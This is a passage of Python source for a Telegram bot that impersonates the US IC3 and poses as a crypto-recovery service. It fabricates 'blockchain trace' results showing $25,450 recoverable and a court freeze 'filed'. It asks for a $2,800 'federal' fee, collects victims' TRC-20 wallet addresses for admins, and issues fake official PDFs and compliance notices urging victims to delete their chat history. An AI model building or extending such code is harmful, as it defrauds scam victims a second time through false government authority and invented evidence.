def _cmp_status_matches(status: str | None, group: frozenset[str]) -> bool:
    s = (status or "").strip()
    if not s:
        return False
    su = s.upper()
    return su in {x.upper() for x in group}


def _cmp_parse(data: str) -> tuple[str | None, str | None, str | None]:
    """cmp|c|slug|case / cmp|m|slug|case / cmp|refresh|case → (op, slug, case_no)。"""
    if not data.startswith("cmp|"):
        return None, None, None
    p = data[4:].split("|")
    if len(p) < 2:
        return None, None, None
    if p[0] in ("c", "m") and len(p) >= 3:
        return p[0], p[1], p[2]
    if len(p) == 2:
        return p[0], None, p[1]
    return None, None, None


def _looks_trc20_usdt_addr(s: str) -> bool:
    if len(s) != 34 or not s.startswith("T"):
        return False
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    return all(ch in alphabet for ch in s[1:])


def _p8_wallet_flow_sep() -> str:
    return "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"


def _wallet_display_short(addr: str, *, head: int = 6, tail: int = 4) -> str:
    a = (addr or "").strip()
    if len(a) <= head + tail + 3:
        return a
    return f"{a[:head]}...{a[-tail:]}"


async def _send_p8_wallet_flow_phase1(message, case_no: str) -> None:
    cn = html.escape((case_no or "").strip())
    sep = _p8_wallet_flow_sep()
    await message.reply_text(
        "⚠️ <b>ADDRESS INPUT INITIATED</b>\n\n"
        f"CASE ID: <code>{cn}</code>\n\n"
        "Please type or paste your TRC-20 (USDT)\n"
        "wallet address below.\n\n"
        f"{sep}\n\n"
        "<b>ADDRESS REQUIREMENTS:</b>\n\n"
        "1. Must start with the letter <code>T</code>\n"
        "2. Must be 34 characters long\n"
        "3. No spaces or special characters\n\n"
        "❌ <b>DO NOT SEND TO:</b>\n"
        "Exchange deposit addresses (Binance, Coinbase, etc.)\n"
        "These addresses will cause permanent loss of funds.\n\n"
        "✅ <b>ONLY USE:</b>\n"
        "Non-Custodial Wallets (Trust Wallet, MetaMask, Exodus)\n\n"
        f"{sep}\n"
        "Please enter your address now:\n"
        "<i>(Reply with your wallet address)</i>",
        parse_mode="HTML",
    )


async def _send_p8_wallet_flow_phase3(message, case_no: str, addr: str) -> None:
    cn = html.escape((case_no or "").strip())
    full = html.escape(addr.strip())
    sep = _p8_wallet_flow_sep()
    kb = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "✅ CONFIRM & LINK ADDRESS",
                    callback_data=f"cmp|p8link|{case_no}",
                )
            ],
            [InlineKeyboardButton("❌ EDIT ADDRESS", callback_data=f"cmp|p8edit|{case_no}")],
        ]
    )
    await message.reply_text(
        "🔍 <b>ADDRESS VERIFICATION SCAN</b>\n\n"
        f"CASE ID: <code>{cn}</code>\n\n"
        "<b>Input Address:</b>\n"
        f"<code>{full}</code>\n\n"
        f"{sep}\n\n"
        "<b>SCAN RESULTS:</b>\n"
        "✅ Format: Valid TRC-20\n"
        "✅ Network: Tron Mainnet\n"
        "✅ Risk Check: No exchange tags detected\n\n"
        f"{sep}\n\n"
        "⚠️ <b>FINAL CONFIRMATION</b>\n\n"
        "You are authorizing the transfer of recovered assets\n"
        "to the above address.\n\n"
        "<b>IMPORTANT:</b>\n"
        "1. Ensure this address is from a Non-Custodial Wallet.\n"
        "2. Double-check the first and last 4 characters.\n"
        "3. This action is <b>IRREVERSIBLE</b>.\n\n"
        "Do you confirm this address?",
        parse_mode="HTML",
        reply_markup=kb,
    )


async def _finalize_trc20_wallet_submission(
    message,
    ctx: ContextTypes.DEFAULT_TYPE,
    *,
    case_no: str,
    addr: str,
    kind: str,
    uid: int,
    p8_success_ui: bool = False,
) -> None:
    """落库、管理员通知、用户成功回执（P7 快捷流程带二维码；P8 三阶段用文案回执）。"""
    import hashlib as _hl

    coc = _hl.sha256(f"{case_no}|TRC20|{uid}|{now_str()}|{addr}".encode()).hexdigest()
    note = f"[TRC-20 wallet ({kind})] {addr}"
    await db.save_liaison_message(case_no, "USER", str(uid), note, coc_hash=coc[:32])
    if kind == "p8wal":
        from bot_modules.adm_cmp_pipeline import notify_p8_wallet_pending_p9

        try:
            await notify_p8_wallet_pending_p9(ctx, case_no, addr, uid)
        except Exception:
            logger.exception("[adm_cmp] notify_p8_wallet_pending_p9 case=%s", case_no)
    else:
        relay = (
            "💳 <b>TRC-20 WALLET SUBMISSION</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>CASE:</b>  <code>{case_no}</code>\n"
            f"<b>UID:</b>   <code>{uid}</code>\n"
            f"<b>KIND:</b>  <code>{kind}</code>\n"
            f"<b>TIME:</b>  {now_str()} UTC\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<code>{html.escape(addr)}</code>\n\n"
            f"🔐 <i>COC: <code>{coc[:32]}</code></i>"
        )
        for admin_id in ADMIN_IDS:
            try:
                await ctx.bot.send_message(admin_id, relay, parse_mode="HTML")
            except Exception:
                pass

    ctx.user_data.pop("state", None)
    ctx.user_data.pop("cmp_trc20_case", None)
    ctx.user_data.pop("cmp_trc20_kind", None)
    ctx.user_data.pop("cmp_p8_pending_addr", None)

    _kb_home = InlineKeyboardMarkup(
        [[InlineKeyboardButton("Return to Main Menu", callback_data="HOME")]]
    )

    if p8_success_ui:
        cn = html.escape((case_no or "").strip())
        short = html.escape(_wallet_display_short(addr))
        sep = _p8_wallet_flow_sep()
        await message.reply_text(
            "✅ <b>ADDRESS LINKED SUCCESSFULLY</b>\n\n"
            f"CASE ID: <code>{cn}</code>\n"
            "STATUS: 🟢 WALLET VERIFIED\n\n"
            f"{sep}\n\n"
            "<b>LINKED WALLET:</b>\n"
            f"Address: <code>{short}</code>\n"
            "Network: TRC-20 (USDT)\n\n"
            f"{sep}",
            parse_mode="HTML",
            reply_markup=_kb_home,
        )
        return

    _cap = (
        "✅ <b>Wallet address received.</b>\n"
        "Your submission has been logged for review.\n\n"
        "📱 <b>QR code</b> — scan to verify the encoded address.\n\n"
        f"<code>{html.escape(addr)}</code>"
    )
    _png = wallet_address_to_qr_png(addr)
    if _png:
        try:
            await message.reply_photo(
                photo=InputFile(_io.BytesIO(_png), filename="wallet_qr.png"),
                caption=_cap,
                parse_mode="HTML",
                reply_markup=_kb_home,
            )
        except Exception:
            logger.exception("CMP wallet QR reply_photo failed")
            await message.reply_text(
                "✅ <b>Wallet address received.</b>\n"
                "Your submission has been logged for review.",
                parse_mode="HTML",
                reply_markup=_kb_home,
            )
    else:
        await message.reply_text(
            "✅ <b>Wallet address received.</b>\n"
            "Your submission has been logged for review.",
            parse_mode="HTML",
            reply_markup=_kb_home,
        )


async def _pdf_data_for_case(case_id: str, pdf_cache: dict) -> tuple[dict, str] | None:
    """优先内存 pdf_cache，否则从 DB case_pdf_snapshot 还原（长期完整）。"""
    ent = pdf_cache.get(case_id)
    if ent:
        return dict(ent["data"]), ent.get("attest_ts") or now_str()
    c = await db.get_case_by_no(case_id)
    if not c:
        return None
    evid = await db.get_evidences(case_id)
    pdf_data = db.pdf_data_from_case_row(c, evidence_files=evid)
    attest_ts = (c.get("created_at") or datetime.utcnow()).strftime("%Y-%m-%d %H:%M:%S UTC")
    return pdf_data, attest_ts


async def _build_case_pdf_bytes_encrypted(
    case_id: str,
    pdf_cache: dict,
    pdf_password: str,
) -> tuple[bytes, dict, str] | None:
    """与「Download PDF」一致：合并实时 status / 证据后，生成 AES-256 口令保护的 PDF。"""
    loaded = await _pdf_data_for_case(case_id, pdf_cache)
    if not loaded:
        return None
    pdf_data, attest_ts = loaded
    c_live = await db.get_case_by_no(case_id)
    if c_live:
        pdf_data["status"] = c_live.get("status", "SUBMITTED")
        live_updated_at = c_live.get("updated_at") or c_live.get("created_at")
        if live_updated_at:
            pdf_data["last_updated"] = live_updated_at.strftime(
                "%Y-%m-%d %H:%M UTC"
            )
    evid_files_live = await db.get_evidences(case_id)
    pdf_data["evidence_files"] = evid_files_live
    pdf_bytes = await generate_case_pdf(
        pdf_data, attest_ts, AUTH_ID, pdf_password=pdf_password
    )
    return pdf_bytes, pdf_data, attest_ts


async def _build_case_pdf_bytes_plain(
    case_id: str,
    pdf_cache: dict,
) -> tuple[bytes, dict, str] | None:
    """用于邮件发送：PIN 验证通过后，生成未加密 PDF。"""
    loaded = await _pdf_data_for_case(case_id, pdf_cache)
    if not loaded:
        return None
    pdf_data, attest_ts = loaded
    c_live = await db.get_case_by_no(case_id)
    if c_live:
        pdf_data["status"] = c_live.get("status", "SUBMITTED")
        live_updated_at = c_live.get("updated_at") or c_live.get("created_at")
        if live_updated_at:
            pdf_data["last_updated"] = live_updated_at.strftime(
                "%Y-%m-%d %H:%M UTC"
            )
    evid_files_live = await db.get_evidences(case_id)
    pdf_data["evidence_files"] = evid_files_live
    pdf_bytes = await generate_case_pdf(pdf_data, attest_ts, AUTH_ID)
    return pdf_bytes, pdf_data, attest_ts


from bot_modules.admin_console import (
    cmd_console, handle_callback as adm_handle_callback,
    kb_case_actions, kb_back_to_cases,
)
from bot_modules.i18n_admin import CASE_DETAIL_HEADER, CASE_DETAIL_FIELDS
from bot_modules.evidence import cmd_upload, cmd_done, photo_handler, document_handler

# ─── Digital Signature / Certificate (CERTIFY-TRANSMIT 新流程) ───
PIN_MAX = 6
RECOVERY_CODE_EXPIRY_MIN = 10
RECOVERY_LOCK_MIN = 30
RECOVERY_CODE_ATTEMPTS_MAX = 3


def _mask_email(email: str) -> str:
    """j.mitchell@gmail.com → j.mit****@gmail.com"""
    if not email or "@" not in email:
        return "***@***"
    local, domain = email.rsplit("@", 1)
    if len(local) <= 4:
        return f"{local[:2]}****@{domain}"
    return f"{local[:4]}****@{domain}"


def _is_valid_email_basic(email: str) -> bool:
    s = (email or "").strip()
    return bool(s) and ("@" in s) and ("." in s) and (" " not in s)


def _generate_recovery_code() -> str:
    return "".join(str(random.randint(0, 9)) for _ in range(6))


def _build_doc_hash_short(case_id: str, ts: str) -> str:
    h = hashlib.sha256(f"{case_id}{ts}".encode()).hexdigest()
    return f"{h[:7]}...{h[-6:]}" if len(h) >= 13 else h


def _pin_dots(length: int) -> str:
    return " ".join("●" if i < length else "_" for i in range(PIN_MAX))


def _hash_pin(pin: str) -> str:
    return hashlib.sha256(pin.encode()).hexdigest()


def _build_pdf_pin_prompt_text(pin_len: int) -> str:
    """下载加密 PDF / 邮件发送前：验证「签名提交时已保存」的 6 位 PIN（非设置新 PIN）。"""
    dots = _pin_dots(pin_len)
    return (
        "[ 🔐 ] VERIFY YOUR SECURITY PIN\n"
        f"{MAIN_SEP}\n"
        "Enter the <b>same 6-digit PIN</b> you set when you\n"
        "<b>signed and submitted</b> this case.\n\n"
        "<i>We use it to confirm it is you before sending the report.</i>\n\n"
        f"{dots}\n"
        f"{MAIN_SEP}\n"
    )


def _build_cts03_pay_prompt_text(pin_len: int) -> str:
    dots = _pin_dots(pin_len)
    return (
        "💳 <b>FEDERAL PAYMENT AUTHORIZATION</b>\n"
        f"{MAIN_SEP}\n"
        "<b>Total due:</b> <code>$2,800.00 USD</code>\n\n"
        "Enter your <b>6-digit payment authorization code</b>.\n\n"
        f"{dots}\n"
        f"{MAIN_SEP}\n"
        "<i>Verification only — this interface does not move funds.</i>"
    )



def _rad02_pseudo_report_id() -> str:
    suffix = "".join(secrets.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(5))
    return f"CI-TRACE-2024-{suffix}"


def _rad02_validate_address_for_chain(address: str, chain_label: str) -> bool:
    if chain_label == "ETH/ERC20/BSC":
        return bool(re.match(r"^0x[0-9a-fA-F]{40}$", address))
    if chain_label == "TRON/TRC20":
        return bool(re.match(r"^T[A-Za-z0-9]{33}$", address))
    if chain_label == "Bitcoin":
        return bool(re.match(r"^(1|3|bc1)[A-Za-z0-9]{25,62}$", address))
    return False


def _build_rad02_pseudo_result(address: str, chain_label: str) -> str:
    """RAD-02: staged narrative result (routing assessment — not on-chain truth)."""
    a = address.strip()
    short_addr = f"{a[:8]}…{a[-6:]}" if len(a) > 18 else a
    tag = hashlib.sha256(f"{a}|{chain_label}".encode()).hexdigest()[:3].upper()
    custodians = {
        "ETH/ERC20/BSC": "Binance — Cold Wallet",
        "TRON/TRC20": "Binance — Cold Wallet",
        "Bitcoin": "Coinbase Prime — Cold Vault",
    }
    cust = custodians.get(chain_label, "Binance — Cold Wallet")
    rep = _rad02_pseudo_report_id()
    return (
        "🔍 <b>Blockchain Analysis Complete</b>\n"
        "────────────────────────────────────\n"
        f"<code>TARGET   : {short_addr}</code>\n"
        f"<code>NETWORK  : {chain_label}</code>\n"
        "────────────────────────────────────\n\n"
        f"📍 <b>Final fund position:</b> {cust} <code>#{tag}</code>\n"
        "💰 <b>Current balance (display est.):</b> <code>$25,450.00 USD</code>\n"
        "   <i>(includes your attributed loss in this trace scope)</i>\n\n"
        "🏛️ <b>Freeze status:</b> Court freeze order — <b>filed</b>\n"
        "⏰ <b>Estimated freeze completion:</b> 24–48 hours\n\n"
        f"📄 <b>Report ID:</b> <code>{rep}</code>\n\n"
        "<i>Routing assessment for intake prioritization only — not a court order. "
        "Official case status: <b>M03 · Case Tracking</b> → Pending Federal Fees (CTS-03) when eligible.</i>"
    )


def _rad02_explorer_url(address: str, chain_label: str) -> str:
    a = address.strip()
    if chain_label == "ETH/ERC20/BSC":
        return f"https://etherscan.io/address/{a}"
    if chain_label == "TRON/TRC20":
        return f"https://tronscan.org/#/address/{a}"
    if chain_label == "Bitcoin":
        return f"https://mempool.space/address/{a}"
    return f"https://etherscan.io/address/{a}"


def _build_rad02_evidence_detail_body(address: str, chain_label: str) -> str:
    a = address.strip()
    short_addr = f"{a[:10]}…{a[-8:]}" if len(a) > 22 else a
    hx = hashlib.sha256(f"RAD02DETAIL|{a}|{chain_label}".encode()).hexdigest()
    h = int(hx[:10], 16)
    hops = 3 + (h % 6)
    cluster = f"HOP-CLUSTER-{(h >> 6) & 0xFFFFFF:06X}"
    corr_score = 87 + (h % 10)
    venue = (
        "Binance hot → cold segregation tier"
        if (h & 1)
        else "OKX pooled settlement → cold archive"
    )
    return (
        "🔍 <b>ASSET TRACE DETAILS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>SUBJECT   : {short_addr}</code>\n"
        f"<code>NETWORK   : {chain_label}</code>\n"
        "────────────────────────────────────\n\n"
        f"<b>Counterparty depth:</b> <code>{hops}</code> mapped hops\n"
        f"<b>Cluster reference:</b> <code>{cluster}</code>\n"
        f"<b>Exchange correlation score:</b> <code>{corr_score}%</code> <i>(routing model)</i>\n"
        f"<b>Terminal routing:</b> {venue}\n\n"
        "<b>Visual exhibits:</b>\n"
        "• <i>Sanitized custody diagrams ship inside the sealed case PDF after "
        "<b>M01</b> submission and PIN verification.</i>\n\n"
        "<b>Freeze pipeline:</b>\n"
        "<code>REQ → DISTRICT DOCKET → CUSTODIAN ACK → HOLD PENDING</code>\n\n"
        "<i>Illustrative trace narrative for intake — not an on-chain proof of balance. "
        "Official updates: <b>M03 · Case Tracking</b> (CTS-03 fee window when eligible).</i>"
    )


def _rad02_result_followup_markup(ctx):
    addr = ctx.user_data.get("rad02_trace_address")
    ch = ctx.user_data.get("rad02_trace_chain")
    case_id = ctx.user_data.get("last_case_id")
    if not addr or not ch:
        return kb_m04()
    return kb_rad02_result_followup(_rad02_explorer_url(addr, ch), case_id)


def _build_recovery_set_pin_text(pin_len: int, warn_html: str = "") -> str:
    dots = _pin_dots(pin_len)
    extra = f"{warn_html}\n\n" if warn_html else ""
    return (
        "[ 🔐 ] SET NEW PIN\n"
        f"{MAIN_SEP}\n"
        "Enter your new 6-digit PIN.\n\n"
        f"{extra}"
        f"{dots}\n"
        f"{MAIN_SEP}\n"
    )


def _build_recovery_confirm_pin_text(pin_len: int, warn_html: str = "") -> str:
    dots = _pin_dots(pin_len)
    extra = f"{warn_html}\n\n" if warn_html else ""
    return (
        "[ 🔐 ] CONFIRM NEW PIN\n"
        f"{MAIN_SEP}\n"
        "Re-enter your new 6-digit PIN.\n\n"
        f"{extra}"
        f"{dots}\n"
        f"{MAIN_SEP}\n"
    )


async def _start_recovery_pin_reset(target, ctx):
    """Recovery verified → start reset-PIN keypad flow."""
    ctx.user_data["state"] = "RECOVERY_SET_PIN"
    ctx.user_data["pin_input"] = []
    ctx.user_data["recovery_new_pin_first"] = None
    await target.reply_text(
        _build_recovery_set_pin_text(0),
        parse_mode="HTML",
        reply_markup=kb_pin_pad(),
    )


async def _resume_after_recovery_pin_reset(target, ctx):
    """After PIN reset success, return to original action flow."""
    origin = ctx.user_data.get("recovery_origin")
    ctx.user_data.pop("recovery_origin", None)
    ctx.user_data.pop("recovery_case_id", None)
    if origin == "PDF_DOWNLOAD":
        ctx.user_data["state"] = "PDF_PIN_WAIT"
        ctx.user_data["pin_input"] = []
        await target.reply_text(
            "✅ <b>PIN updated successfully.</b>\n"
            "Please confirm your new PIN to continue PDF download.",
            parse_mode="HTML",
        )
        await target.reply_text(
            _build_pdf_pin_prompt_text(0),
            parse_mode="HTML",
            reply_markup=kb_pin_pad(show_forgot=True),
        )
        return
    if origin == "CERT_EMAIL":
        ctx.user_data["state"] = "CERT_EMAIL_PIN_WAIT"
        ctx.user_data["pin_input"] = []
        await target.reply_text(
            "✅ <b>PIN updated successfully.</b>\n"
            "Please confirm your new PIN to continue email delivery.",
            parse_mode="HTML",
        )
        await target.reply_text(
            _build_pdf_pin_prompt_text(0),
            parse_mode="HTML",
            reply_markup=kb_pin_pad(show_forgot=True),
        )
        return

    # fallback: no origin, keep legacy behavior
    ctx.user_data["state"] = None
    reset_ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    text = build_recovery_success_text(reset_ts, AUTH_REF)
    await target.reply_text(text, parse_mode="HTML", reply_markup=kb_recovery_main_menu())


async def _process_pdf_pin_and_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE, pin: str, target):
    """Validate case PIN and send AES-256 encrypted PDF."""
    case_id = ctx.user_data.get("pdf_download_case_id") or ""
    ph = await db.get_case_pin_hash(case_id)
    if not ph:
        await target.reply_text(
            "❌ No security PIN on file for this case.\n"
            "PDF encryption requires the PIN set under Privacy &amp; Signature.",
            parse_mode="HTML",
        )
        ctx.user_data["state"] = None
        ctx.user_data.pop("pdf_download_case_id", None)
        ctx.user_data.pop("pin_input", None)
        return
    if not secrets.compare_digest(_hash_pin(pin), ph):
        await target.reply_text("❌ Incorrect PIN. Try again.")
        return

    ctx.user_data["state"] = None
    ctx.user_data.pop("pdf_download_case_id", None)
    ctx.user_data.pop("pin_input", None)
    pdf_cache = ctx.bot_data.setdefault("pdf_cache", {})
    proc_msg = await target.reply_text(
        "<b>Generating AES-256 encrypted PDF...</b>\nPlease wait.",
        parse_mode="HTML",
    )
    SYSTEM_INTEGRITY_NOTICE = (
        "🛡️ SYSTEM INTEGRITY NOTICE\n"
        "The reporting engine is currently undergoing a mandatory security "
        "synchronization. Your data remains encrypted and safe. Please "
        "re-initiate this module in 5 minutes."
    )
    try:
        out = await _build_case_pdf_bytes_encrypted(case_id, pdf_cache, pin)
        if not out:
            await proc_msg.edit_text(
                "❌ PDF not available. Case data may have expired.",
                parse_mode="HTML",
            )
            return
        pdf_bytes, _pdf_data, _attest_ts = out
        fname = f"IC3_Case_{case_id}.pdf"
        pdf_file = _io.BytesIO(pdf_bytes)
        pdf_file.name = fname
        await ctx.bot.send_document(
            chat_id=update.effective_chat.id,
            document=pdf_file,
            filename=fname,
            caption=(
                f"📂 <b>IC3 Official Case Confirmation</b>\n"
                f"<code>{case_id}</code>\n\n"
                "🔐 <b>AES-256 encrypted PDF.</b> Open with your 6-digit PIN\n"
                "(offline, no server required)."
            ),
            parse_mode="HTML",
        )
        await proc_msg.delete()
        import asyncio

        privacy_msg = await target.reply_text(
            "🛡️ <b>FEDERAL DATA PRIVACY COMPLIANCE</b>\n"
            "────────────────────\n"
            "✅ <b>SUCCESS:</b> Official record transmitted.\n\n"
            "<b>System Status:</b>\n"
            "Per NIST SP 800-53 standards, all PII (Personally Identifiable\n"
            "Information) from this session has been permanently purged from\n"
            "the server memory.\n\n"
            "<b>Action Required:</b>\n"
            "For your protection, please <b>manually delete</b> this chat\n"
            "history within the next <b>5 minutes</b>.\n\n"
            "⏳ This <b>notice</b> will self-delete in 60 seconds.",
            parse_mode="HTML",
        )

        async def _auto_delete_privacy_notice():
            await asyncio.sleep(60)
            try:
                await privacy_msg.delete()
            except Exception:
                pass

        asyncio.create_task(_auto_delete_privacy_notice())
    except Exception as e:
        logger.error("PDF generation failed: %s", e, exc_info=True)
        await proc_msg.edit_text(SYSTEM_INTEGRITY_NOTICE, parse_mode="HTML")


async def _process_cert_email_pin_and_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE, pin: str, target):
    """Validate case PIN and send plain PDF by email."""
    case_id = ctx.user_data.get("cert_email_case_id") or ""
    email = ctx.user_data.get("cert_email_to") or ""
    if not _is_valid_email_basic(email):
        await target.reply_text(
            "❌ Email address is missing or invalid.\n"
            "Please re-enter recipient email and try again.",
            parse_mode="HTML",
        )
        ctx.user_data["state"] = "CERT_EMAIL_ENTER"
        ctx.user_data.pop("cert_email_to", None)
        ctx.user_data.pop("pin_input", None)
        return
    ph = await db.get_case_pin_hash(case_id)
    if not ph:
        await target.reply_text(
            "❌ No security PIN on file for this case.",
            parse_mode="HTML",
        )
        ctx.user_data["state"] = None
        ctx.user_data.pop("cert_email_case_id", None)
        ctx.user_data.pop("cert_email_to", None)
        ctx.user_data.pop("pin_input", None)
        return
    if not secrets.compare_digest(_hash_pin(pin), ph):
        await target.reply_text("❌ Incorrect PIN. Try again.")
        return

    ctx.user_data["state"] = None
    ctx.user_data.pop("cert_email_case_id", None)
    to_addr = email
    ctx.user_data.pop("cert_email_to", None)
    ctx.user_data.pop("pin_input", None)
    sending = await target.reply_text(
        "⏳ <b>Sending case report...</b>\nPlease wait.",
        parse_mode="HTML",
    )
    pdf_cache = ctx.bot_data.setdefault("pdf_cache", {})
    try:
        out = await _build_case_pdf_bytes_plain(case_id, pdf_cache)
        if not out:
            await sending.edit_text(
                "❌ Unable to locate case PDF for email delivery.",
                parse_mode="HTML",
            )
            return
        pdf_bytes, pdf_data, attest_ts = out
        pdf_filename = f"{case_id}_Case_Report.pdf"
        await _send_case_email_with_pdf(
            to_addr, case_id, pdf_bytes, pdf_filename, pdf_data, attest_ts
        )
        await sending.edit_text(
            "✅ <b>CASE REPORT SENT</b>\n\n"
            "Your PDF has been sent to:\n\n"
            f"📩  <code>{to_addr}</code>\n\n"
            "PIN verification was completed before sending.\n"
            "Please check your inbox.",
            parse_mode="HTML",
        )
    except Exception as e:
        logger.error("email cert send failed: %s", e, exc_info=True)
        await sending.edit_text(
            "❌ Failed to send encrypted report email.\n"
            "Please try again in a moment.",
            parse_mode="HTML",
        )


async def _send_submit_loading(target):
    """复用 Status Inquiry 风格的加载动画。"""
    import asyncio
    msg = await target.reply_text(
        "<code>[IC3-NODE] Authenticating Secure Link...</code>\n"
        "<code>▓░░░░░░░░░  10%  — Verifying identity...</code>",
        parse_mode="HTML",
    )
    await asyncio.sleep(0.8)
    try:
        await msg.edit_text(
            "<code>[IC3-NODE] Authenticating Secure Link...</code>\n"
            "<code>▓▓▓▓░░░░░░  45%  — Decrypting record...</code>",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await asyncio.sleep(0.8)
    try:
        await msg.edit_text(
            "<code>[IC3-NODE] Authenticating Secure Link...</code>\n"
            "<code>▓▓▓▓▓▓▓▓▓░  90%  — Generating state hash...</code>",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await asyncio.sleep(0.6)
    try:
        await msg.delete()
    except Exception:
        pass


async def _gen_unique_case_id() -> str:
    """生成在数据库中不存在的案号，避免与已有案件重复。"""
    for _ in range(30):
        candidate = gen_case_id()
        if await db.get_case_by_no(candidate) is None:
            return candidate
        logger.warning("[CASE_ID] collision retry: %s already exists", candidate)
    return gen_case_id()


async def show_signature_request(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """用户点击 I CERTIFY 后：推送 DIGITAL SIGNATURE REQUEST，预生成 case_id 与 doc hash。"""
    q = update.callback_query
    user_id = update.effective_user.id
    last = _last_submission.get(user_id)
    if not bypass_submit_cooldown(update.effective_user) and last and (
        datetime.now() - last
    ) < timedelta(hours=SUBMIT_COOLDOWN_HOURS):
        remaining = timedelta(hours=SUBMIT_COOLDOWN_HOURS) - (datetime.now() - last)
        hours_left = int(remaining.total_seconds() // 3600)
        await q.answer("⚠️ Submission rate limit — please try again later.", show_alert=True)
        await q.message.reply_text(
            f"⚠️ <b>Submission Rate Limit</b>\n\n"
            f"You have already submitted within the last {SUBMIT_COOLDOWN_HOURS} hours.\n\n"
            f"⏳ Please wait approximately <b>{hours_left} more hour(s)</b>.",
            parse_mode="HTML",
        )
        return
    if bypass_submit_cooldown(update.effective_user):
        logger.info(
            "[QA] submit cooldown bypass show_signature_request uid=%s @%s",
            user_id,
            update.effective_user.username or "",
        )
    try:
        await q.edit_message_reply_markup(reply_markup=None)
    except Exception:
        pass
    case_id = await _gen_unique_case_id()
    submitted_utc = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    doc_hash_short = _build_doc_hash_short(case_id, submitted_utc)
    ctx.user_data["pending_case_id"] = case_id
    ctx.user_data["pending_submit_ts"] = submitted_utc
    ctx.user_data["pending_doc_hash_full"] = hashlib.sha256(f"{case_id}{submitted_utc}".encode()).hexdigest()
    ctx.user_data["pending_signature_at"] = datetime.utcnow()
    logger.info("[VERIFY] STEP 1 — Signature request: case_id=%s user_id=%s", case_id, user_id)
    text = build_signature_request_text(case_id, submitted_utc)
    await q.message.reply_text(text, parse_mode="HTML", reply_markup=kb_signature_request())


async def handle_sign_and_submit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Sign & Submit: 统一走 设置 PIN → 确认 PIN（与案件号绑定）。"""
    q = update.callback_query
    user_id = update.effective_user.id
    # 30 min session expiry
    pending_at = ctx.user_data.get("pending_signature_at")
    if pending_at and (datetime.utcnow() - pending_at) > timedelta(minutes=30):
        logger.info("[VERIFY] STEP 2 entry: session expired (30 min) user_id=%s", user_id)
        await q.answer("⏱ Session expired. Please restart with /start", show_alert=True)
        await q.message.reply_text(
            "⏱ <b>Session expired.</b>\n\nPlease restart with /start",
            parse_mode="HTML",
        )
        return
    try:
        await q.edit_message_reply_markup(reply_markup=None)
    except Exception:
        pass
    # Case already signed or user tries to re-submit / edit after signing
    case_id = ctx.user_data.get("pending_case_id")
    if case_id and await db.get_signature_by_case_no(case_id):
        logger.info("[VERIFY] STEP 2 entry: case already signed case_id=%s user_id=%s", case_id, user_id)
        await q.answer("Case already signed.", show_alert=True)
        await q.message.reply_text(
            "🔒 <b>Case is locked.</b>\n\n"
            "Contact ic3.gov/support to request amendments.",
            parse_mode="HTML",
        )
        return
    ctx.user_data["state"] = "CASE_SET_PIN"
    ctx.user_data["pin_input"] = []
    ctx.user_data["case_pin_first"] = None
    dots = _pin_dots(0)
    text = (
        "[ 🔐 ] SET YOUR SECURITY PIN\n"
        f"{MAIN_SEP}\n\n"
        " Enter a new 6-digit PIN.\n"
        "  You will confirm it in the next step.\n\n"
        f"  {dots}\n\n"
        f"{MAIN_SEP}\n"
    )
    await q.message.reply_text(text, parse_mode="HTML", reply_markup=kb_pin_pad())
    await q.answer()


async def handle_case_pin_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE, data: str):
    q = update.callback_query
    state = ctx.user_data.get("state")
    if state not in ("CASE_SET_PIN", "CASE_CONFIRM_PIN"):
        await q.answer()
        return
    pin_input = list(ctx.user_data.get("pin_input") or [])
    if data == "pin|del":
        if pin_input:
            pin_input.pop()
            ctx.user_data["pin_input"] = pin_input
        dots = _pin_dots(len(pin_input))
        if state == "CASE_SET_PIN":
            text = (
                "[ 🔐 ] SET YOUR SECURITY PIN\n"
                f"{MAIN_SEP}\n\n"
                " Enter a new 6-digit PIN.\n"
                "  You will confirm it in the next step.\n\n"
                f"  {dots}\n\n"
                f"{MAIN_SEP}\n"
            )
        else:
            text = (
                "[ 🔐 ] CONFIRM YOUR PIN\n"
                f"{MAIN_SEP}\n\n"
                " Re-enter your 6-digit PIN.\n"
                "  Confirm to proceed.\n\n"
                f"  {dots}\n\n"
                f"{MAIN_SEP}\n"
            )
        try:
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb_pin_pad())
        except Exception:
            pass
        await q.answer()
        return
    if data == "pin|confirm":
        if len(pin_input) != PIN_MAX:
            await q.answer(f"Enter {PIN_MAX} digits first.", show_alert=True)
            return
        pin_str = "".join(str(x) for x in pin_input)
        if state == "CASE_SET_PIN":
            ctx.user_data["case_pin_first"] = pin_str
            ctx.user_data["state"] = "CASE_CONFIRM_PIN"
            ctx.user_data["pin_input"] = []
            dots = _pin_dots(0)
            text = (
                "[ 🔐 ] CONFIRM YOUR PIN\n"
                f"{MAIN_SEP}\n\n"
                " Re-enter your 6-digit PIN.\n"
                "  Confirm to proceed.\n\n"
                f"  {dots}\n\n"
                f"{MAIN_SEP}\n"
            )
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb_pin_pad())
            await q.answer()
            return
        first = (ctx.user_data.get("case_pin_first") or "").strip()
        if pin_str != first:
            ctx.user_data["state"] = "CASE_SET_PIN"
            ctx.user_data["pin_input"] = []
            ctx.user_data["case_pin_first"] = None
            dots = _pin_dots(0)
            text = (
                "[ 🔐 ] SET YOUR SECURITY PIN\n"
                f"{MAIN_SEP}\n\n"
                " Enter a new 6-digit PIN.\n"
                "  You will confirm it in the next step.\n\n"
                f"  ⚠️ <i>PINs do not match. Enter a new PIN.</i>\n\n"
                f"  {dots}\n\n"
                f"{MAIN_SEP}\n"
            )
